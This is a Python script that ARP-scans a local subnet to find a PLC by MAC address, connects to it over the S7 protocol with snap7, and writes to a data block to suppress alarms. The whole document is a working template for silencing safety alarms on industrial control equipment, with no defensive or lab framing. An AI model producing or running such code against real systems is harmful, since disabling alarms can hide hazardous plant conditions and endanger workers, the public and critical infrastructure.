import socket
import struct
import snap7
from scapy.all import ARP, Ether, srp

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the target IP range to scan
    target_ip = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=3, verbose=0)[0]
    
    # Parse the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    # Filter out the PLC based on MAC address (assuming you know the PLC's MAC address)
    plc_mac = "00:11:22:33:44:55"  # Replace with the actual PLC MAC address
    for device in devices:
        if device['mac'] == plc_mac:
            return device['ip']
    
    return None

# Function to connect to the PLC
def connect_to_plc(ip):
    client = snap7.client.Client()
    client.connect(ip, 0, 1)  # Rack 0, Slot 1
    return client

# Function to suppress alarms
def suppress_alarms(client):
    # Example: Suppress an alarm by setting a specific bit in a flag
    db_number = 1  # Data block number
    start_address = 0  # Start address in the data block
    data = b'\x00'  # Set the bit to 0 to suppress the alarm
    
    # Write to the PLC's memory
    client.db_write(db_number, start_address, data)

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        print("PLC not found on the network.")
        return
    
    print(f"PLC found at IP: {plc_ip}")
    
    # Connect to the PLC
    client = connect_to_plc(plc_ip)
    if not client.get_connected():
        print("Failed to connect to the PLC.")
        return
    
    print("Connected to the PLC.")
    
    # Suppress alarms
    suppress_alarms(client)
    print("Alarms suppressed.")
    
    # Close the connection
    client.disconnect()
    print("Disconnected from the PLC.")

if __name__ == "__main__":
    main()